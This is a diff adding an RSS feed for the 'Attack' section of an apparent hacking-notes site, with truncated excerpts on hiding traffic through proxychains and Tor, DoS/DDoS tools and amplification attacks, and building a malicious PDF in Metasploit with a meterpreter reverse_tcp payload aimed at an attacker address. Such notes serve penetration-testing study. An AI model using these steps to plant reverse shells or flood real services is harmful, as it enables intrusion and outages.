@@ -1,0 +1,33 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Attack on D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/docs/hdks/network/attack/</link>
+    <description>Recent content in Attack on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Wed, 17 Jan 2024 15:17:37 +0530</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/docs/hdks/network/attack/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Anonymize Traffic with Tor</title>
+      <link>https://documentnation.github.io/docs/hdks/network/attack/anonymize-traffic-with-tor/</link>
+      <pubDate>Sat, 23 Dec 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/network/attack/anonymize-traffic-with-tor/</guid>
+      <description>Privacy Friendly OS link Tails Qubes Whonix Anonymization link1. Configure Proxychains linkFirst off, find the location of the proxychains configuration file.&#xA;find / -type f -name &amp;#34;*proxychains*&amp;#34; 2&amp;gt;/dev/null Assume we found /etc/proxychains.conf then modify this file.&#xA;vim /etc/proxychains We need to remove # in front of dynamic_chains, then comment out the strict_chain line and the random_chain line.&#xA;In addition, check the proxy_dns is uncommented for avoiding our DNS to be leaked.</description>
+    </item>
+    <item>
+      <title>DoS/DDoS Attack</title>
+      <link>https://documentnation.github.io/docs/hdks/network/attack/dos-ddos-attack/</link>
+      <pubDate>Wed, 27 Sep 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/network/attack/dos-ddos-attack/</guid>
+      <description>Comprehensive Tools link LOIC (Low Orbit Ion Cannon)&#xA;A network stress tool written in C#.&#xA;MHDDoS&#xA;A DDoS Attack Script written in Python3 with 56 methods.&#xA;UDP Flood Attack link Python-UDP-Flood&#xA;stress-udp-flood.c&#xA;This is a C code to stress test for UDP flood.&#xA;NTP (Network Time Protocol) Amplification Attack linkThis attack often uses monlist command for sending packets to target without authentication.&#xA;Low and Slow Attack (Slow HTTP Attack) linkLow and Slow Attack sends traffic slowly then makes it impossible the legitimate user to access the web service.</description>
+    </item>
+    <item>
+      <title>Adobe PDF Attack</title>
+      <link>https://documentnation.github.io/docs/hdks/network/attack/adobe-pdf-attack/</link>
+      <pubDate>Mon, 24 Jul 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/network/attack/adobe-pdf-attack/</guid>
+      <description>Exploitation using Metasploit linkThe PDF created by this process can be easily detected by modern Windows built-in antivirus. So this exploitation may be not useful for attackers.&#xA;1. Create a PDF linkAttackers can create a malicious PDF using metasploit.&#xA;msfconsole msf&amp;gt; use exploit/windows/fileformat/adobe_pdf_embedded_exe # Set payload for windows if target machine is windows msf&amp;gt; set payload windows/x64/meterpreter/reverse_tcp # Set the attacker&amp;#39;s ip address msf&amp;gt; set lhost 10.0.0.1 # Change filename msf&amp;gt; set filename supersafe.</description>
+    </item>
+  </channel>
+</rss>
